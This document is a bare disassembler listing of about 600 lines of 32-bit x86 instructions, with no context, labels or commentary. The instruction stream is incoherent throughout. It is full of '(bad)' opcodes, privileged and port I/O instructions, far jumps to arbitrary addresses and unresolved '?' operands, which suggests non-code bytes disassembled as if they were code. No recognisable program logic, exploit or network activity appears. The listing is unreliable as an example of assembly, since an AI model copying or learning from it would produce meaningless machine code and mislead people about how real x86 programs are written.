  4105eb:	retf   0x1bc0
  4105ee:	das    
  4105ef:	xchg   ecx,eax
  4105f0:	pushf  
  4105f1:	sbb    esp,DWORD PTR [esi]
  4105f3:	pop    ds
  4105f4:	jmp    0x410619
  4105f6:	pushw  ss
  4105f8:	mov    ch,0x99
  4105fa:	sub    edi,DWORD PTR [edx+esi*4-0x13977fda]
  410601:	dec    ebp
  410602:	ds lock jl 0x4105ba
  410606:	jmp    0x2b5cfa6b
  41060b:	pop    ecx
  41060c:	enter  0x9e60,0x34
  410610:	pushf  
  410611:	xchg   ebp,eax
  410612:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410614:	xor    bh,BYTE PTR [eax+0x11]
  410617:	xor    DWORD PTR [esi+eax*1],edi
  41061a:	push   ds
  41061b:	jno    0x4105d3
  41061d:	rcr    BYTE PTR [ebp+0x6da5824a],0x4b
  410624:	mov    DWORD PTR [edx-0x4c2dcb45],eax
  41062a:	jmp    0x7514e371
  41062f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410630:	jne    0x410698
  410632:	cld    
  410633:	popf   
  410634:	loop   0x410618
  410636:	mov    ch,ch
  410638:	dec    eax
  410639:	cld    
  41063a:	leave  
  41063b:	je     0x410637
  41063d:	mov    BYTE PTR [esi],dh
  41063f:	stos   DWORD PTR es:[edi],eax
  410640:	mov    bh,dl
  410642:	and    esp,edi
  410644:	pop    ebx
  410645:	add    BYTE PTR [ebp+0x4c],al
  410648:	pop    esp
  410649:	inc    esi
  41064a:	imul   edx,DWORD PTR [edi-0x66],0xffffff97
  41064e:	add    al,0x46
  410650:	iret   
  410651:	xlat   BYTE PTR ds:[ebx]
  410652:	mov    dl,0xf0
  410654:	xor    dl,BYTE PTR [eax-0x59]
  410657:	pop    esp
  410658:	inc    ebp
  410659:	xchg   edi,eax
  41065a:	lods   al,BYTE PTR ds:[esi]
  41065b:	and    dl,BYTE PTR [eax]
  41065d:	bound  esi,QWORD PTR [ecx+ebx*1]
  410660:	clc    
  410661:	push   cs
  410662:	xor    ah,BYTE PTR [eax]
  410664:	push   ds
  410665:	sub    esp,esi
  410667:	xchg   ebx,eax
  410668:	xchg   esp,eax
  410669:	stc    
  41066a:	xor    BYTE PTR [ecx+edi*8-0x39],ch
  41066e:	stc    
  41066f:	add    eax,0x5c7b118f
  410674:	jb     0x4106cf
  410676:	dec    edx
  410677:	fld    TBYTE PTR [ebx+0x3a]
  41067a:	cld    
  41067b:	jae    0x4106ef
  41067d:	sub    al,0xa4
  41067f:	add    BYTE PTR [esi+0x7e],0xf5
  410683:	cli    
  410684:	sti    
  410685:	jne    0x410644
  410687:	test   eax,0xb21484f6
  41068c:	jmp    0x81dda3e4
  410691:	outs   dx,DWORD PTR ds:[esi]
  410692:	push   ds
  410693:	ins    BYTE PTR es:[edi],dx
  410694:	inc    edi
  410695:	and    edx,DWORD PTR [eax+edi*2-0x63]
  410699:	mov    bh,0x1
  41069b:	cmp    BYTE PTR [edx-0x18],dl
  41069e:	sar    BYTE PTR [esi+0x367f1fd7],0x9c
  4106a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106a6:	add    DWORD PTR [ebx+eax*1+0x2f82b7ac],edx
  4106ad:	js     0x4106d0
  4106af:	aam    0x1a
  4106b1:	outs   dx,BYTE PTR ds:[esi]
  4106b2:	ins    BYTE PTR es:[edi],dx
  4106b3:	sub    al,ch
  4106b5:	pop    ecx
  4106b6:	sar    BYTE PTR [esi+ecx*1+0x6146941e],0x4f
  4106be:	ret    0xb526
  4106c1:	or     eax,0x58295be5
  4106c6:	xchg   ebx,eax
  4106c7:	sub    DWORD PTR [edx-0x42b04524],0xffffffca
  4106ce:	popa   
  4106cf:	pop    es
  4106d0:	and    DWORD PTR [ebx+eiz*1+0x7b76952f],edi
  4106d7:	mov    DWORD PTR [ebx],eax
  4106d9:	retf   0x7960
  4106dc:	scas   eax,DWORD PTR es:[edi]
  4106dd:	push   esp
  4106de:	loope  0x41073e
  4106e0:	dec    esp
  4106e1:	push   esp
  4106e2:	iret   
  4106e3:	jne    0x410688
  4106e5:	add    BYTE PTR [ebp+esi*1-0x2c1286cf],ah
  4106ec:	sbb    eax,0xbc8b1989
  4106f1:	scas   eax,DWORD PTR es:[edi]
  4106f2:	in     al,0x59
  4106f4:	(bad)  
  4106f5:	test   al,0xfc
  4106f7:	inc    eax
  4106f8:	add    ebx,DWORD PTR [esi+0x2a]
  4106fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106fc:	(bad)  
  4106fd:	call   0xea7e3efc
  410702:	call   0xabcfe621
  410707:	int    0x21
  410709:	cmp    edx,DWORD PTR [edx]
  41070b:	in     al,0x21
  41070d:	js     0x41076e
  41070f:	inc    eax
  410710:	and    DWORD PTR [edx+0x13],ebp
  410713:	lock scas eax,DWORD PTR es:[edi]
  410715:	push   eax
  410716:	cmp    dl,BYTE PTR [ebx]
  410718:	jne    0x410732
  41071a:	cs adc esp,ebx
  41071d:	fmul   QWORD PTR [edx]
  41071f:	into   
  410720:	loopne 0x410778
  410722:	popf   
  410723:	das    
  410724:	test   eax,0xe7ee5009
  410729:	inc    ebx
  41072a:	sahf   
  41072b:	outs   dx,DWORD PTR ds:[esi]
  41072c:	jp     0x41078c
  41072e:	std    
  41072f:	fdiv   QWORD PTR [edi]
  410731:	jmp    0x62f9f32
  410736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410737:	inc    edi
  410738:	pushf  
  410739:	xor    eax,0x4ab76d01
  41073e:	mov    bh,0xf0
  410740:	or     ebx,DWORD PTR [ebp-0x2d]
  410743:	push   esp
  410744:	adc    ebx,DWORD PTR [edi-0x1237cd63]
  41074a:	(bad)  
  41074b:	into   
  41074c:	adc    DWORD PTR [edi-0x109803f2],0x1e
  410753:	cmp    ch,cl
  410755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410756:	pop    edx
  410757:	mov    BYTE PTR [esi-0x72],dh
  41075a:	mov    WORD PTR [ecx+ecx*8],?
  41075d:	dec    esp
  41075e:	leave  
  41075f:	mov    eax,ds:0xbb1b1725
  410764:	inc    esp
  410765:	mov    ecx,0x31b2664a
  41076a:	push   0x56ff659a
  41076f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410770:	inc    ebx
  410771:	dec    ecx
  410772:	mov    cl,0x9e
  410774:	inc    ebx
  410775:	xor    BYTE PTR ds:0x189e5bbf,ah
  41077b:	push   esp
  41077c:	(bad)  
  41077d:	sahf   
  41077e:	jae    0x410714
  410780:	jl     0x4107f2
  410782:	jb     0x4107f9
  410784:	leave  
  410785:	jbe    0x4107eb
  410787:	sbb    edx,eax
  410789:	jae    0x410760
  41078b:	int    0xfb
  41078d:	mov    ebp,0x43113178
  410792:	jmp    0xb056:0x770fd145
  410799:	shld   ecx,ebx,0xe5
  41079d:	int    0x98
  41079f:	in     al,dx
  4107a0:	jns    0x9edf4123
  4107a6:	test   BYTE PTR [ebx-0x3467b80b],al
  4107ac:	push   0xffffffb8
  4107ae:	cdq    
  4107af:	add    BYTE PTR [ebp-0x6f137b36],dl
  4107b5:	push   ebx
  4107b6:	jnp    0x410813
  4107b8:	dec    ebx
  4107b9:	inc    esp
  4107ba:	fbstp  TBYTE PTR [edi]
  4107bc:	shr    BYTE PTR [ecx],1
  4107be:	stos   BYTE PTR es:[edi],al
  4107bf:	dec    edi
  4107c0:	mov    ds:0x755e0c0d,al
  4107c5:	ss mov eax,0x8cc06292
  4107cb:	fs mov bh,0x9d
  4107ce:	int    0x2d
  4107d0:	in     al,dx
  4107d1:	cmc    
  4107d2:	je     0x4107a7
  4107d4:	push   ebp
  4107d5:	loopne 0x4107c9
  4107d7:	fdivr  QWORD PTR [esi+0x3779d6b8]
  4107dd:	call   0xfb3b:0x7664c627
  4107e4:	fwait
  4107e5:	or     eax,0x3f2bbe1
  4107ea:	push   cs
  4107eb:	test   DWORD PTR [eax-0x660447d3],ebx
  4107f1:	pop    ebp
  4107f2:	sti    
  4107f3:	mov    dh,0x8f
  4107f5:	add    edi,DWORD PTR [esi+0x22]
  4107f8:	sub    eax,0x35aa918e
  4107fd:	scas   al,BYTE PTR es:[edi]
  4107fe:	(bad)  
  4107ff:	cli    
  410800:	jle    0x4107e6
  410802:	retf   
  410803:	stos   BYTE PTR es:[edi],al
  410804:	retf   
  410805:	inc    esi
  410806:	pop    es
  410807:	outs   dx,BYTE PTR ds:[esi]
  410808:	addr16 mov ebp,0xc6bc2e9a
  41080e:	idiv   DWORD PTR [esi]
  410810:	cmp    edi,esi
  410812:	push   es
  410813:	retf   0x9039
  410816:	adc    eax,0x68013445
  41081b:	mov    WORD PTR [ebx-0xa876605],ss
  410821:	xchg   DWORD PTR [esi-0x79],eax
  410824:	jbe    0x410839
  410826:	aaa    
  410827:	clc    
  410828:	aam    0x38
  41082a:	pop    edx
  41082b:	xchg   edi,eax
  41082c:	repnz mov ds:0xa906f979,eax
  410832:	daa    
  410833:	imul   edx,DWORD PTR [esp+eiz*4],0x34
  410837:	mov    edi,DWORD PTR [eax+0x47]
  41083a:	test   BYTE PTR [edx],bl
  41083c:	push   esp
  41083d:	pop    esi
  41083e:	loopne 0x410889
  410840:	fs jno 0x410880
  410843:	push   edx
  410844:	shr    BYTE PTR [edx+0x66],0x72
  410848:	push   edi
  410849:	std    
  41084a:	xor    esp,0xffffffc5
  41084d:	pusha  
  41084e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41084f:	add    cl,BYTE PTR [ecx]
  410851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410852:	jge    0x410810
  410854:	repnz and BYTE PTR [eax-0x611681b8],ch
  41085b:	ins    DWORD PTR es:[edi],dx
  41085c:	call   FWORD PTR [esi]
  41085e:	in     eax,dx
  41085f:	test   al,0xee
  410861:	cmp    dh,ah
  410863:	ret    0x2a85
  410866:	int3   
  410867:	aad    0x54
  410869:	adc    BYTE PTR [ebx-0x5cf4b491],ch
  41086f:	xchg   DWORD PTR [ebx-0x7c],ecx
  410872:	pusha  
  410873:	lods   eax,DWORD PTR ds:[esi]
  410874:	mov    bh,0x96
  410876:	in     al,dx
  410877:	ins    BYTE PTR es:[edi],dx
  410878:	cmp    dh,BYTE PTR [esi+0x7d48cbef]
  41087e:	sub    eax,0xffffff88
  410881:	sbb    al,0x38
  410883:	sub    bh,BYTE PTR [ebx+ecx*8]
  410886:	xor    ebp,DWORD PTR [eax+ecx*4+0x40]
  41088a:	and    eax,0xb2166645
  41088f:	adc    ah,BYTE PTR gs:[edi]
  410892:	sbb    BYTE PTR [ebx],bl
  410894:	xchg   esp,eax
  410895:	push   ecx
  410896:	or     eax,0x4ceaa051
  41089b:	mov    ebp,0x24d079c4
  4108a0:	or     al,0x3b
  4108a2:	xor    dl,ah
  4108a4:	fisubr WORD PTR [esi+ebp*8-0x7fdd90aa]
  4108ab:	or     BYTE PTR [esp+esi*8+0x68a37499],ah
  4108b2:	add    al,0xd9
  4108b4:	jge    0x4108b1
  4108b6:	ja     0x4108ad
  4108b8:	outs   dx,DWORD PTR ds:[esi]
  4108b9:	sbb    BYTE PTR [esi],al
  4108bb:	inc    ebx
  4108bc:	jle    0x41089e
  4108be:	xchg   ebp,eax
  4108bf:	jmp    0xc5f25ff0
  4108c4:	femms  
  4108c6:	jl     0x4108b4
  4108c8:	adc    al,0xce
  4108ca:	pop    edx
  4108cb:	out    dx,al
  4108cc:	cmp    eax,0x9f0e3737
  4108d1:	retf   0x811b
  4108d4:	scas   al,BYTE PTR es:[edi]
  4108d5:	adc    bh,BYTE PTR [ebx]
  4108d7:	and    bh,bl
  4108d9:	dec    ebp
  4108da:	stos   BYTE PTR es:[edi],al
  4108db:	rcl    DWORD PTR [edi],1
  4108dd:	ja     0x4108f2
  4108df:	sub    DWORD PTR [edi+0x27],edx
  4108e2:	push   edx
  4108e3:	mov    al,0xd6
  4108e5:	mov    WORD PTR [edi+ebp*4],ss
  4108e8:	pop    ecx
  4108e9:	add    ebx,DWORD PTR [ebp-0x6e]
  4108ec:	test   BYTE PTR [ecx],0x83
  4108ef:	push   ds
  4108f0:	sbb    ah,ch
  4108f2:	jno    0x4108d4
  4108f4:	jno    0x4108c2
  4108f6:	fisub  DWORD PTR [edx+ecx*4+0x4]
  4108fa:	adc    ch,BYTE PTR [edx]
  4108fc:	xor    edi,DWORD PTR [ebp-0x3f56edee]
  410902:	test   DWORD PTR [eax-0x2c],eax
  410905:	arpl   WORD PTR [eax-0x5f94a5dc],si
  41090b:	pop    ds
  41090c:	push   ss
  41090d:	gs push esi
  41090f:	sub    al,BYTE PTR [ecx+0x6c29aac0]
  410915:	or     BYTE PTR ds:0xb475fd4d,cl
  41091b:	fmul   st,st(3)
  41091d:	or     al,0x3d
  41091f:	ds icebp 
  410921:	cmp    BYTE PTR [ecx-0x24],0xf8
  410925:	push   edi
  410926:	cmp    DWORD PTR [ebp+0x15],0xffffffcc
  41092a:	cli    
  41092b:	push   0xfffffff2
  41092d:	lahf   
  41092e:	rcr    esi,0xf4
  410931:	test   DWORD PTR [edx-0x59a1f812],edx
  410937:	xor    DWORD PTR [ecx-0x7c],edi
  41093a:	stos   DWORD PTR es:[edi],eax
  41093b:	ins    BYTE PTR es:[edi],dx
  41093c:	dec    eax
  41093d:	lahf   
  41093e:	sub    al,0x7a
  410940:	adc    DWORD PTR [eax-0x67d729de],esi
  410946:	(bad)  
  410947:	jmp    0xee75002
  41094c:	xor    ecx,eax
  41094e:	xor    al,0x72
  410950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410951:	ins    DWORD PTR es:[edi],dx
  410952:	ins    DWORD PTR es:[edi],dx
  410953:	arpl   bx,dx
  410955:	cmp    DWORD PTR [eax],0x6fca167f
  41095b:	or     BYTE PTR [esi-0x14],dl
  41095e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41095f:	xchg   ecx,eax
  410960:	sbb    DWORD PTR [esi+ecx*1],esi
  410963:	retf   
  410964:	fstp   DWORD PTR [eax]
  410966:	dec    eax
  410967:	add    DWORD PTR [ecx],ecx
  410969:	mov    esp,0xc4c4c57a
  41096e:	and    BYTE PTR [edx],bl
  410970:	jl     0x4109ad
  410972:	mov    BYTE PTR [ebx+0x6d],0x71
  410976:	lds    edi,FWORD PTR [ebp-0x42]
  410979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41097a:	or     edi,DWORD PTR [ebp+eiz*4-0x47]
  41097e:	mov    eax,0x21086b4e
  410983:	or     al,0x46
  410985:	and    eax,0x81246ff6
  41098a:	aam    0x4c
  41098c:	and    DWORD PTR [eax],0xffffff96
  41098f:	in     al,0xf8
  410991:	(bad)  
  410992:	loope  0x4109b0
  410994:	push   0xd363499e
  410999:	pcmpgtb mm5,QWORD PTR [edx+0x10]
  41099d:	mov    al,ds:0xd8f83f70
  4109a2:	lods   al,BYTE PTR ds:[esi]
  4109a3:	call   0xf88:0x6798e7f3
  4109aa:	adc    eax,ecx
  4109ac:	xchg   esp,esi
  4109ae:	sbb    DWORD PTR [esi+0x6a],eax
  4109b1:	jne    0x410942
  4109b3:	inc    ecx
  4109b4:	bound  eax,QWORD PTR [edx-0x77b4c5d5]
  4109ba:	mov    ds:0x7fff3809,eax
  4109bf:	dec    edx
  4109c0:	mov    dh,BYTE PTR [esi-0x5c]
  4109c3:	out    0x4c,eax
  4109c5:	mov    bh,0x25
  4109c7:	xor    esp,edi
  4109c9:	enter  0x26a9,0x2a
  4109cd:	pop    edx
  4109ce:	aaa    
  4109cf:	les    ecx,FWORD PTR [eax-0x16]
  4109d2:	or     DWORD PTR [ebx],edx
  4109d4:	jp     0x410a1e
  4109d6:	and    ebp,esi
  4109d8:	out    0x1c,al
  4109da:	mov    esp,0xf57050c8
  4109df:	pop    eax
  4109e0:	mov    bl,0x7f
  4109e2:	lea    edi,[ecx]
  4109e4:	push   eax
  4109e5:	mov    al,0xac
  4109e7:	jnp    0x410a58
  4109e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ea:	stc    
  4109eb:	jb     0x410a31
  4109ed:	(bad)  
  4109ee:	lods   al,BYTE PTR ds:[esi]
  4109ef:	jge    0x410a4d
  4109f1:	xor    bh,BYTE PTR [eax+0x72]
  4109f4:	pop    esi
  4109f5:	shr    DWORD PTR [edi+0x6433e46e],1
  4109fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109fc:	ins    DWORD PTR es:[edi],dx
  4109fd:	in     eax,dx
  4109fe:	sti    
  4109ff:	and    al,0x2d
  410a01:	mov    bl,0x1a
  410a03:	cmp    eax,0x3759190c
  410a08:	ss jb  0x4109fc
  410a0b:	xchg   ebx,eax
  410a0c:	xor    DWORD PTR [ebp+esi*1+0x43b36701],eax
  410a13:	outs   dx,DWORD PTR ds:[esi]
  410a14:	pop    ss
  410a15:	mov    edi,0x91fb1a48
  410a1a:	xchg   ecx,eax
  410a1b:	dec    esp
  410a1c:	jae    0x41099f
  410a1e:	push   edi
  410a1f:	shl    DWORD PTR [ecx],1
  410a21:	repz pop ds
  410a23:	test   ah,bl
  410a25:	mov    cl,0xa3
  410a27:	sbb    BYTE PTR [esi+eax*8+0x33],bh
  410a2b:	loop   0x4109b3
  410a2d:	sbb    cl,BYTE PTR [eax]
  410a2f:	loope  0x410a52
  410a31:	test   DWORD PTR [ecx],edx
  410a33:	outs   dx,DWORD PTR ds:[esi]
  410a34:	xor    edx,DWORD PTR [edi]
  410a36:	sbb    BYTE PTR [edx-0x1],bl
  410a39:	pop    ss
  410a3a:	loop   0x4109fe
  410a3c:	push   eax
  410a3d:	pop    ebx
  410a3e:	daa    
  410a3f:	mov    dl,0x8a
  410a41:	and    al,0x8d
  410a43:	(bad)  
  410a44:	push   ss
  410a45:	mov    cl,0x9e
  410a47:	imul   esi,edx,0x1ea6fad7
  410a4d:	std    
  410a4e:	(bad)  
  410a4f:	loopne 0x410acb
  410a51:	pop    esp
  410a52:	push   es
  410a53:	(bad)  
  410a54:	jecxz  0x410a83
  410a56:	jp     0x410a61
  410a58:	fwait
  410a59:	jae    0x410ab4
  410a5b:	pop    ds
  410a5c:	xor    esp,ebp
  410a5e:	dec    ebp
  410a5f:	ds aas 
  410a61:	adc    eax,0x306fddf1
  410a66:	call   0x3b5dd2c8
  410a6b:	(bad)  
  410a6c:	daa    
  410a6d:	in     al,0x33
  410a6f:	scas   eax,DWORD PTR es:[edi]
  410a70:	dec    eax
  410a71:	div    DWORD PTR [ecx-0x632f00ab]
  410a77:	(bad)  
  410a78:	mov    esp,0xde705cf8
  410a7d:	inc    ebp
  410a7e:	jae    0x410a43
  410a80:	cmp    BYTE PTR [edi-0x30],al
  410a83:	push   di
  410a85:	jb     0x410a13
  410a87:	loop   0x410adf
  410a89:	ins    DWORD PTR es:[edi],dx
  410a8a:	ins    DWORD PTR es:[edi],dx
  410a8b:	shr    cl,1
  410a8d:	push   0x78e2f05a
  410a92:	les    esp,FWORD PTR [edx-0x38630747]
  410a98:	pop    edx
  410a99:	inc    esi
  410a9a:	neg    edx
  410a9c:	mov    eax,DWORD PTR [edx-0x14ca9dc4]
  410aa2:	lea    ecx,[ebx+eax*2-0xd]
  410aa6:	cmp    BYTE PTR [esi+eiz*1+0x8],ah
  410aaa:	(bad)  
  410aab:	push   es
  410aac:	fild   QWORD PTR [edx+eiz*4]
  410aaf:	mov    dl,0x3e
  410ab1:	add    ebp,DWORD PTR [edx-0x34]
  410ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ab5:	sar    DWORD PTR [edi-0x80],0x41
  410ab9:	ret    0x17d7
  410abc:	xchg   esi,eax
  410abd:	adc    edx,DWORD PTR [edi-0x74]
  410ac0:	ss xchg esi,eax
  410ac2:	pop    ebx
  410ac3:	in     eax,0xf3
  410ac5:	sub    al,0x2
  410ac7:	(bad)  
  410ac8:	push   edi
  410ac9:	aad    0xfe
  410acb:	scas   al,BYTE PTR es:[edi]
  410acc:	push   ebp
  410acd:	add    cl,ch
  410acf:	xor    DWORD PTR [ecx+0xb],edx
  410ad2:	or     eax,0xb6245fa3
  410ad7:	pop    edi
  410ad8:	aaa    
  410ad9:	mov    eax,ds:0x80df54a0
  410ade:	shl    BYTE PTR ds:0xa550efa0,cl
  410ae4:	jo     0x410b41
  410ae6:	test   bl,dl
  410ae8:	mov    ebx,0xb187c0e7
  410aed:	dec    eax
  410aee:	in     al,0xee
  410af0:	dec    ebp
  410af1:	repnz mov dh,0xa1
  410af4:	jp     0x410ac2
  410af6:	cdq    
  410af7:	add    eax,0x5192e899
  410afc:	daa    
  410afd:	mov    dl,0x56
  410aff:	cmp    DWORD PTR [ecx-0x62b3e6b0],edx
  410b05:	ins    BYTE PTR es:[edi],dx
  410b06:	fisttp DWORD PTR [ecx+ebx*2]
  410b09:	loopne 0x410ab3
  410b0b:	push   ebp
  410b0c:	dec    edi
  410b0d:	xor    edx,DWORD PTR [ecx]
  410b0f:	call   FWORD PTR [edx+0x2d]
  410b12:	(bad)  [edx]
  410b14:	add    al,0xf1
  410b16:	and    DWORD PTR ds:0x49797b9e,0xffffff8c
  410b1d:	sahf   
  410b1e:	pop    edx
  410b1f:	aaa    
  410b20:	std    
  410b21:	repz ror DWORD PTR [eax+0x28761e9b],cl
  410b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b29:	ins    BYTE PTR es:[edi],dx
  410b2a:	cmp    ah,ah
  410b2c:	jmp    0x8eae14dc
  410b31:	cwde   
  410b32:	into   
  410b33:	outs   dx,DWORD PTR ds:[esi]
  410b34:	fstp   TBYTE PTR [esi]
  410b36:	dec    edi
  410b37:	sub    BYTE PTR [ecx],cl
  410b39:	mov    DWORD PTR [edx+0x4b14934a],esi
  410b3f:	(bad)  
  410b40:	clc    
  410b41:	sbb    eax,0x818b34bb
  410b46:	cli    
  410b47:	fwait
  410b48:	xor    BYTE PTR [eax+0x6f13e7e6],bl
  410b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b4f:	jb     0x410ae7
  410b51:	or     DWORD PTR [esi],0xffffffaa
  410b54:	or     edx,edi
  410b56:	aaa    
  410b57:	push   0x5476a956
  410b5c:	out    dx,al
  410b5d:	rol    BYTE PTR [ecx-0x2ccdd614],0xea
  410b64:	fs lock (bad) 
  410b67:	lock or eax,0x7f629d0a
  410b6d:	jmp    ecx
  410b6f:	std    
  410b70:	aaa    
  410b71:	aaa    
  410b72:	inc    ebx
  410b73:	in     eax,0x98
  410b75:	mov    ch,ch
  410b77:	call   0xa51340d9
  410b7c:	mov    ch,0x21
  410b7f:	mov    al,ds:0xeef22c49
  410b84:	es push esp
  410b86:	enter  0xaf62,0xf
  410b8a:	mov    ch,BYTE PTR [ebx*1+0x58a682e7]
  410b91:	push   ebx
  410b92:	shl    DWORD PTR [ecx],1
  410b94:	cli    
  410b95:	jecxz  0x410b4d
  410b97:	lds    eax,FWORD PTR [ebp+ecx*2+0x55]
  410b9b:	mov    esi,DWORD PTR [ecx]
  410b9d:	xor    al,0x7f
  410b9f:	rcr    BYTE PTR [edx],cl
  410ba1:	mov    ebp,0x7598cf30
  410ba6:	popa   
  410ba7:	and    eax,0xab081dbb
  410bac:	lea    ecx,ds:0xff5649cc
  410bb2:	fnstcw WORD PTR [ecx-0x23d195b8]
  410bb8:	xchg   ebp,eax
  410bb9:	sti    
  410bba:	pop    eax
  410bbb:	jno    0x410bea
  410bbd:	jo     0x410c30
  410bbf:	mov    ds:0x511b401,eax
  410bc4:	mov    dh,0x3e
  410bc6:	loop   0x410bf5
  410bc8:	icebp  
  410bc9:	ins    DWORD PTR es:[edi],dx
  410bca:	(bad)  
  410bcb:	mov    ecx,0x79bf682d
  410bd0:	xlat   BYTE PTR ds:[ebx]
  410bd1:	cli    
  410bd2:	lds    ebp,FWORD PTR [ebp+0x2e]
  410bd5:	sbb    eax,0xa6b17941
  410bda:	dec    ebx
  410bdb:	icebp  
  410bdc:	mov    dh,0x67
  410bde:	mov    cl,0x8d
  410be0:	inc    ebx
  410be1:	push   esi
  410be2:	rcr    DWORD PTR [esi+0x16b3bae1],cl
  410be8:	jmp    0x22f5:0xe0680b91
  410bef:	pushf  
  410bf0:	push   0xb013e85c
  410bf5:	jns    0x410bd3
  410bf7:	dec    esi
  410bf8:	(bad)  
  410bf9:	je     0x410c2a
  410bfb:	jb     0x410c62
  410bfd:	dec    edx
  410bfe:	pop    es
  410bff:	(bad)  
  410c00:	test   DWORD PTR [ebx+0xed6fefc],0xb48a0b30
  410c0a:	or     DWORD PTR [ecx],ecx
  410c0c:	fdivr  st(6),st
  410c0f:	lahf   
  410c10:	inc    edi
  410c11:	in     eax,0xe4
  410c13:	cmp    DWORD PTR [esi*1-0x286046d6],0xffffff85
  410c1b:	loope  0x410b9d
  410c1d:	push   edi
  410c1e:	mov    dh,0x80
  410c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c21:	fnstcw WORD PTR [ebx+0x5e]
  410c24:	pop    ebp
  410c25:	cld    
  410c26:	or     al,0x2a
  410c28:	lods   al,BYTE PTR ds:[esi]
  410c29:	sar    BYTE PTR [edi-0x3d],0x51
  410c2d:	mov    edx,0xc60fd9b3
  410c32:	cmc    
  410c33:	adc    ebp,DWORD PTR [ecx+esi*4+0x1c9a3ff1]
  410c3a:	xchg   ebp,eax
  410c3b:	outs   dx,DWORD PTR ds:[esi]
  410c3c:	and    BYTE PTR [ecx-0x109a3aee],ch
  410c42:	and    edi,ebp
  410c44:	mov    ecx,0x11ea8c74
  410c49:	inc    esp
  410c4a:	cmp    bl,BYTE PTR [eax+ecx*1-0x5354fab6]
  410c51:	mov    ecx,DWORD PTR [esi+esi*2]
  410c54:	mov    dl,0x35
  410c56:	icebp  
  410c57:	push   ds
  410c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c59:	pop    ebx
  410c5a:	stos   DWORD PTR es:[edi],eax
  410c5b:	arpl   WORD PTR [edx+0x20399e80],cx
  410c61:	sub    eax,0xbcda599e
  410c66:	and    eax,0xdfdd75f6
  410c6b:	stc    
  410c6c:	popa   
  410c6d:	cs adc al,0x1f
  410c70:	mov    ah,ch
  410c72:	cmp    al,0xfd
  410c74:	test   eax,0x762e828f
  410c79:	sub    al,0x2e
  410c7b:	sahf   
  410c7c:	cwde   
  410c7d:	xlat   BYTE PTR ds:[ebx]
  410c7e:	jo     0x410c5e
  410c80:	xchg   esp,eax
  410c81:	xchg   esp,eax
  410c82:	or     eax,0x5cbeaf47
  410c87:	ins    DWORD PTR es:[edi],dx
  410c88:	pop    es
  410c89:	in     al,0xdf
  410c8b:	out    0x90,eax
  410c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c8e:	(bad)  
  410c8f:	ss xchg esp,eax
  410c91:	dec    ebp
  410c92:	retf   
  410c93:	icebp  
  410c94:	mov    ?,WORD PTR [eax-0x9c2b788]
  410c9a:	mov    ebp,0x2a6e25ef
  410c9f:	dec    ebx
  410ca0:	fisttp DWORD PTR [ecx]
  410ca2:	mov    eax,0x13df94f7
  410ca7:	lock inc eax
  410ca9:	mov    BYTE PTR [esi+0x53],ch
  410cac:	xlat   BYTE PTR ds:[ebx]
  410cad:	(bad)  
  410cae:	adc    DWORD PTR [ecx-0x3aba84ba],0x34c96863
  410cb8:	test   al,0xbf
  410cbb:	ins    BYTE PTR es:[edi],dx
  410cbc:	outs   dx,DWORD PTR ds:[esi]
  410cbd:	lods   al,BYTE PTR ds:[esi]
  410cbe:	xor    BYTE PTR [edi-0x7c],dl
  410cc1:	loop   0x410d33
  410cc3:	cmp    ebx,DWORD PTR [ecx]
  410cc5:	mov    eax,ds:0x4f461487
  410cca:	jle    0x410c4d
  410ccc:	dec    esi
  410ccd:	cmp    eax,0xd764b972
  410cd2:	icebp  
  410cd3:	mov    esp,0x90776406
  410cd8:	adc    eax,0x25593605
  410cdd:	rcr    BYTE PTR [edi+eiz*8+0x70],cl
  410ce1:	icebp  
  410ce2:	int3   
  410ce3:	adc    bh,al
  410ce5:	ret    
  410ce6:	fisub  WORD PTR [ebp+0x7a]
  410ce9:	cmp    DWORD PTR [eax],0x18
  410cec:	mov    al,0x80
  410cee:	sti    
  410cef:	cmp    eax,0xa2ae59a0
  410cf4:	cmp    BYTE PTR [eax+eax*1],bl
  410cf7:	aad    0xef
  410cf9:	mov    BYTE PTR [esi+ecx*2-0x323fe6e2],dl
  410d00:	mov    ecx,0x683ecf40
  410d05:	adc    al,0xe
  410d07:	sar    BYTE PTR [edi],cl
  410d09:	jp     0x410d10
  410d0b:	leave  
  410d0c:	push   ds
  410d0d:	fwait
  410d0e:	loope  0x410d50
  410d10:	mov    esp,0x10e9688
  410d15:	add    DWORD PTR [esi+eiz*8],esp
  410d18:	cmp    al,0xdf
  410d1a:	popa   
  410d1b:	les    ebx,FWORD PTR [ebx+0x5b045fe3]
  410d21:	lds    ecx,FWORD PTR [eax-0x5d]
  410d24:	ret    
  410d25:	sahf   
  410d26:	mov    dh,BYTE PTR [eax-0x66]
  410d29:	cs and ch,ah
  410d2c:	ins    BYTE PTR es:[edi],dx
  410d2d:	inc    esi
  410d2e:	or     ebx,DWORD PTR [ebx+0x151304ce]
  410d34:	test   al,0x1
  410d36:	lods   al,BYTE PTR ds:[esi]
  410d37:	xor    BYTE PTR [edx-0x32],cl
  410d3a:	fld    TBYTE PTR [ebx]
  410d3c:	push   ecx
  410d3d:	cmp    BYTE PTR [edi-0x7705d398],ah
  410d43:	xor    eax,0xe75d238b
  410d48:	push   ebx
  410d49:	or     DWORD PTR [eax],ecx
  410d4b:	dec    eax
